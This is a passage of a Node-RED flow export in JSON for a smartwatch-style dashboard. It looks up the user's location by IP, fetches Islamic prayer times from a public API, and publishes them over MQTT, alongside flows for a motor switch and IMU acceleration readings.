        "y": 100,
        "wires": []
    },
    {
        "id": "32159b8cc79c46d4",
        "type": "inject",
        "z": "9e3fb32af7cf4fda",
        "name": "Prayer Request",
        "props": [
            {
                "p": "payload"
            },
            {
                "p": "topic",
                "vt": "str"
            }
        ],
        "repeat": "",
        "crontab": "",
        "once": false,
        "onceDelay": 0.1,
        "topic": "getPrayerTimes",
        "payload": "true",
        "payloadType": "bool",
        "x": 160,
        "y": 100,
        "wires": [
            [
                "ab071985806ecf8c"
            ]
        ]
    },
    {
        "id": "0ff83d4ee8beab26",
        "type": "debug",
        "z": "9e3fb32af7cf4fda",
        "name": "Display Prayer Times",
        "active": true,
        "tosidebar": true,
        "console": true,
        "tostatus": false,
        "complete": "payload",
        "targetType": "msg",
        "statusVal": "",
        "statusType": "auto",
        "x": 790,
        "y": 180,
        "wires": []
    },
    {
        "id": "d3a38c25c94cf281",
        "type": "mqtt in",
        "z": "9e3fb32af7cf4fda",
        "name": "/watch/prayertimes/response",
        "topic": "/watch/prayertimes",
        "qos": "2",
        "datatype": "auto-detect",
        "broker": "0f98d85555b05267",
        "nl": false,
        "rap": true,
        "rh": 0,
        "inputs": 0,
        "x": 180,
        "y": 160,
        "wires": [
            [
                "71f76c276e2b9623"
            ]
        ]
    },
    {
        "id": "f540d578ee09b239",
        "type": "ui_text",
        "z": "9e3fb32af7cf4fda",
        "group": "eea7c2eb37b4ee60",
        "order": 2,
        "width": "6",
        "height": "5",
        "name": "Prayer Times Display",
        "label": "Prayer Times at Current Location",
        "format": "<ul>   <li><b>Fajr:</b> {{msg.payload.Fajr}}</li>   <li><b>Dhuhr:</b> {{msg.payload.Dhuhr}}</li>   <li><b>Asr:</b> {{msg.payload.Asr}}</li>   <li><b>Maghrib:</b> {{msg.payload.Maghrib}}</li>   <li><b>Isha:</b> {{msg.payload.Isha}}</li> </ul>",
        "layout": "col-center",
        "className": "",
        "style": true,
        "font": "Lucida Sans Typewriter,Lucida Console,Monaco,monospace",
        "fontSize": "18",
        "color": "#000000",
        "x": 780,
        "y": 260,
        "wires": []
    },
    {
        "id": "fdb351ee8b286c1a",
        "type": "http request",
        "z": "9e3fb32af7cf4fda",
        "name": "GET prayer times",
        "method": "GET",
        "ret": "obj",
        "paytoqs": "ignore",
        "url": "http://api.aladhan.com/v1/timings?latitude={{{payload.lat}}}&longitude={{{payload.lon}}}&method=2",
        "tls": "",
        "persist": false,
        "proxy": "",
        "insecureHTTPParser": false,
        "authType": "",
        "senderr": false,
        "headers": [],
        "x": 370,
        "y": 220,
        "wires": [
            [
                "695e9497bbd724df"
            ]
        ]
    },
    {
        "id": "695e9497bbd724df",
        "type": "function",
        "z": "9e3fb32af7cf4fda",
        "name": "Get Prayer Times",
        "func": "// if (msg.payload && msg.payload.data && msg.payload.data.timings) {\n//     const timings = msg.payload.data.timings;\n//     msg.payload = {\n//         Fajr: timings.Fajr,\n//         Dhuhr: timings.Dhuhr,\n//         Asr: timings.Asr,\n//         Maghrib: timings.Maghrib,\n//         Isha: timings.Isha\n//     };\n// } else {\n//     msg.payload = 'Prayer times data not available';\n// }\n// return msg;\n\nfunction convertTo12Hour(timeString) {\n    const [hours, minutes] = timeString.split(':').map(Number);\n    const ampm = hours >= 12 ? 'PM' : 'AM';\n    const hours12 = hours % 12 || 12;\n    return `${hours12}:${minutes < 10 ? '0' + minutes : minutes} ${ampm}`;\n}\n\nif (msg.payload && msg.payload.data && msg.payload.data.timings) {\n    const timings = msg.payload.data.timings;\n    msg.payload = {\n        Fajr: convertTo12Hour(timings.Fajr),\n        Dhuhr: convertTo12Hour(timings.Dhuhr),\n        Asr: convertTo12Hour(timings.Asr),\n        Maghrib: convertTo12Hour(timings.Maghrib),\n        Isha: convertTo12Hour(timings.Isha)\n    };\n} else {\n    msg.payload = 'Prayer times data not available';\n}\nreturn msg;\n",
        "outputs": 1,
        "timeout": 0,
        "noerr": 0,
        "initialize": "",
        "finalize": "",
        "libs": [],
        "x": 570,
        "y": 220,
        "wires": [
            [
                "f540d578ee09b239",
                "0ff83d4ee8beab26",
                "f707c9d889ac7de3"
            ]
        ]
    },
    {
        "id": "ab071985806ecf8c",
        "type": "ui_button",
        "z": "9e3fb32af7cf4fda",
        "name": "Update Weather",
        "group": "eea7c2eb37b4ee60",
        "order": 1,
        "width": 0,
        "height": 0,
        "passthru": true,
        "label": "Update Prayer Times",
        "tooltip": "",
        "color": "",
        "bgcolor": "green",
        "className": "",
        "icon": "",
        "payload": "true",
        "payloadType": "bool",
        "topic": "topic",
        "topicType": "msg",
        "x": 380,
        "y": 100,
        "wires": [
            [
                "b4c6b0cb47bd3929"
            ]
        ]
    },
    {
        "id": "71f76c276e2b9623",
        "type": "http request",
        "z": "9e3fb32af7cf4fda",
        "name": "GET location",
        "method": "GET",
        "ret": "obj",
        "paytoqs": "ignore",
        "url": "http://ip-api.com/json",
        "tls": "",
        "persist": false,
        "proxy": "",
        "insecureHTTPParser": false,
        "authType": "",
        "senderr": false,
        "headers": [],
        "x": 190,
        "y": 220,
        "wires": [
            [
                "fdb351ee8b286c1a"
            ]
        ]
    },
    {
        "id": "bd3eae3a4168f56a",
        "type": "mqtt in",
        "z": "9e3fb32af7cf4fda",
        "name": "/watch/iplocation",
        "topic": "/watch/iplocation",
        "qos": "2",
        "datatype": "json",
        "broker": "0f98d85555b05267",
        "nl": false,
        "rap": true,
        "rh": 0,
        "inputs": 0,
        "x": 140,
        "y": 280,
        "wires": [
            [
                "fdb351ee8b286c1a"
            ]
        ]
    },
    {
        "id": "3b7c1e1565459038",
        "type": "mqtt out",
        "z": "9e3fb32af7cf4fda",
        "name": "/watch/prayertimes/mcu",
        "topic": "/watch/prayertimes/mcu",
        "qos": "2",
        "retain": "true",
        "respTopic": "",
        "contentType": "",
        "userProps": "",
        "correl": "",
        "expiry": "",
        "broker": "0f98d85555b05267",
        "x": 990,
        "y": 340,
        "wires": []
    },
    {
        "id": "f707c9d889ac7de3",
        "type": "function",
        "z": "9e3fb32af7cf4fda",
        "name": "Parse to String",
        "func": "msg.payload = `${msg.payload.Fajr}, ${msg.payload.Dhuhr}, ${msg.payload.Asr}, ${msg.payload.Maghrib}, ${msg.payload.Isha}`;\nreturn msg;",
        "outputs": 1,
        "timeout": 0,
        "noerr": 0,
        "initialize": "",
        "finalize": "",
        "libs": [],
        "x": 760,
        "y": 340,
        "wires": [
            [
                "3b7c1e1565459038"
            ]
        ]
    },
    {
        "id": "422f3a017cca7920",
        "type": "inject",
        "z": "7fee5a622c31903e",
        "name": "inject",
        "props": [
            {
                "p": "payload"
            },
            {
                "p": "topic",
                "vt": "str"
            }
        ],
        "repeat": "",
        "crontab": "",
        "once": false,
        "onceDelay": 0.1,
        "topic": "",
        "payload": "false",
        "payloadType": "bool",
        "x": 190,
        "y": 120,
        "wires": [
            [
                "3097c34a1b0338e4",
                "d6b7f816fbfbabd9"
            ]
        ]
    },
    {
        "id": "3097c34a1b0338e4",
        "type": "ui_switch",
        "z": "7fee5a622c31903e",
        "name": "Motor switch",
        "label": "Motor switch",
        "tooltip": "",
        "group": "b391efae71c73b5a",
        "order": 0,
        "width": 0,
        "height": 0,
        "passthru": false,
        "decouple": "false",
        "topic": "topic",
        "topicType": "msg",
        "style": "",
        "onvalue": "true",
        "onvalueType": "bool",
        "onicon": "",
        "oncolor": "",
        "offvalue": "false",
        "offvalueType": "bool",
        "officon": "",
        "offcolor": "",
        "animate": false,
        "className": "",
        "x": 350,
        "y": 60,
        "wires": [
            [
                "d6b7f816fbfbabd9",
                "6b63450692815a82",
                "f3a57c0220b4c0d4"
            ]
        ]
    },
    {
        "id": "d6b7f816fbfbabd9",
        "type": "mqtt out",
        "z": "7fee5a622c31903e",
        "name": "/watch/motor",
        "topic": "/watch/motor",
        "qos": "2",
        "retain": "true",
        "respTopic": "",
        "contentType": "",
        "userProps": "",
        "correl": "",
        "expiry": "",
        "broker": "0f98d85555b05267",
        "x": 570,
        "y": 120,
        "wires": []
    },
    {
        "id": "6b63450692815a82",
        "type": "debug",
        "z": "7fee5a622c31903e",
        "name": "debug 1",
        "active": true,
        "tosidebar": true,
        "console": true,
        "tostatus": false,
        "complete": "payload",
        "targetType": "msg",
        "statusVal": "",
        "statusType": "auto",
        "x": 570,
        "y": 60,
        "wires": []
    },
    {
        "id": "5b87448f17727dcd",
        "type": "ui_text",
        "z": "7fee5a622c31903e",
        "group": "b391efae71c73b5a",
        "order": 1,
        "width": 0,
        "height": 0,
        "name": "",
        "label": "Motor is",
        "format": "{{msg.payload}}",
        "layout": "col-center",
        "className": "",
        "style": false,
        "font": "",
        "fontSize": 16,
        "color": "#000000",
        "x": 680,
        "y": 200,
        "wires": []
    },
    {
        "id": "f3a57c0220b4c0d4",
        "type": "function",
        "z": "7fee5a622c31903e",
        "name": "function 1",
        "func": "if (msg.payload == true) {\n    msg.payload = \"ON\"\n} else {\n    msg.payload = \"OFF\"\n}\nreturn msg;",
        "outputs": 1,
        "timeout": 0,
        "noerr": 0,
        "initialize": "",
        "finalize": "",
        "libs": [],
        "x": 540,
        "y": 200,
        "wires": [
            [
                "5b87448f17727dcd"
            ]
        ]
    },
    {
        "id": "d253a98ed14e2eef",
        "type": "inject",
        "z": "0f52f4266dc4f328",
        "name": "Request",
        "props": [
            {
                "p": "payload"
            },
            {
                "p": "topic",
                "vt": "str"
            }
        ],
        "repeat": "60",
        "crontab": "",
        "once": false,
        "onceDelay": 0.1,
        "topic": "",
        "payload": "true",
        "payloadType": "bool",
        "x": 180,
        "y": 160,
        "wires": [
            [
                "1c57aa448ebc38c6"
            ]
        ]
    },
    {
        "id": "1c57aa448ebc38c6",
        "type": "mqtt out",
        "z": "0f52f4266dc4f328",
        "name": "sensor",
        "topic": "sensor",
        "qos": "2",
        "retain": "true",
        "respTopic": "",
        "contentType": "",
        "userProps": "",
        "correl": "",
        "expiry": "",
        "broker": "0f98d85555b05267",
        "x": 570,
        "y": 160,
        "wires": []
    },
    {
        "id": "66ca7971a662647e",
        "type": "mqtt in",
        "z": "0f52f4266dc4f328",
        "name": "/watch/imu/res",
        "topic": "resP",
        "qos": "2",
        "datatype": "auto-detect",
        "broker": "0f98d85555b05267",
        "nl": false,
        "rap": true,
        "rh": 0,
        "inputs": 0,
        "x": 150,
        "y": 260,
        "wires": [
            [
                "216942ce04f67d05",
                "4063691f0ae7b151"
            ]
        ]
    },
    {
        "id": "216942ce04f67d05",
        "type": "ui_text",
        "z": "0f52f4266dc4f328",
        "group": "ed47eec370a82b85",
        "order": 1,
        "width": 0,
        "height": 0,
        "name": "",
        "label": "Acceleration",
        "format": "{{msg.payload}}",
        "layout": "col-center",
        "className": "",
        "style": false,
        "font": "",
        "fontSize": 16,
        "color": "#000000",
        "x": 370,
        "y": 260,
        "wires": []
    },
    {
        "id": "2c0706f6ab993deb",
        "type": "ui_button",
        "z": "0f52f4266dc4f328",
        "name": "",
        "group": "ed47eec370a82b85",
        "order": 2,
        "width": 0,
        "height": 0,
        "passthru": false,
        "label": "Request Data",
        "tooltip": "",
        "color": "",
        "bgcolor": "",
        "className": "",
        "icon": "",
        "payload": "true",
        "payloadType": "bool",
        "topic": "topic",
        "topicType": "msg",
        "x": 400,
        "y": 100,
        "wires": [
            [
                "1c57aa448ebc38c6"
            ]
        ]
    },
    {
        "id": "4063691f0ae7b151",
        "type": "debug",
        "z": "0f52f4266dc4f328",
        "name": "debug 2",
        "active": true,
        "tosidebar": true,
        "console": true,
        "tostatus": false,
        "complete": "payload",
        "targetType": "msg",
        "statusVal": "",
        "statusType": "auto",
        "x": 350,
        "y": 320,
        "wires": []
    },
    {
        "id": "7f1d95b08d009084",
        "type": "mqtt in",
        "z": "995e66d9c3486925",
        "name": "",
        "topic": "hasPrayed",
        "qos": "2",
        "datatype": "utf8",
        "broker": "0f98d85555b05267",
        "nl": false,
        "rap": true,
        "rh": 0,
        "inputs": 0,
        "x": 280,
        "y": 100,
        "wires": [
            [
                "b8ac98f34aa6a484"
            ]
        ]
    },
    {
        "id": "b8ac98f34aa6a484",
        "type": "ui_text",
        "z": "995e66d9c3486925",
        "group": "23579b0648736c3c",
        "order": 0,
        "width": 0,
        "height": 0,
        "name": "",
        "label": "Did you pray the last prayer?",
        "format": "{{msg.payload}}",
        "layout": "col-center",
        "className": "",
        "style": false,
        "font": "",
        "fontSize": 16,
        "color": "#000000",
        "x": 480,
        "y": 160,
        "wires": []
    }
]